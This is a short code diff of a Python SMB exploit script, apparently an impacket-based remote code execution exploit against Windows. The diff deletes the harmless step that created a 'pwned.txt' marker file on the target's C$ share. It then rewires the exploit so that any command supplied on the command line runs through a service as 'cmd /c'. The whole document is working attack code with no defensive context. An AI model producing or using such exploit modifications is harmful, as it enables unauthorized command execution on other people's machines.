@@ -396,15 +396,9 @@ def exploit(target, pipe_name, username, password, cmd):
 def smb_pwn(conn, cmd):
 	smbConn = smbconnection.SMBConnection(conn.get_remote_host(), conn.get_remote_host(), existingConnection=conn, manualNegotiate=True)
 
-	print('creating file c:\\pwned.txt on the target')
-	tid2 = smbConn.connectTree('C$')
-	fid2 = smbConn.createFile(tid2, '/pwned.txt')
-	smbConn.closeFile(tid2, fid2)
-	smbConn.disconnectTree(tid2)
-
 	shell_cmd = r'cmd /c'
 	shell_cmd += cmd
-	#service_exec(smbConn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+
 	service_exec(smbConn, shell_cmd)
 
 # based on impacket/examples/serviceinstall.py
@@ -476,6 +470,5 @@ username = sys.argv[3]
 password = sys.argv[4]
 cmd = sys.argv[5]
 
-print cmd
 exploit(target, pipe_name, username, password, cmd)
 print('Done')
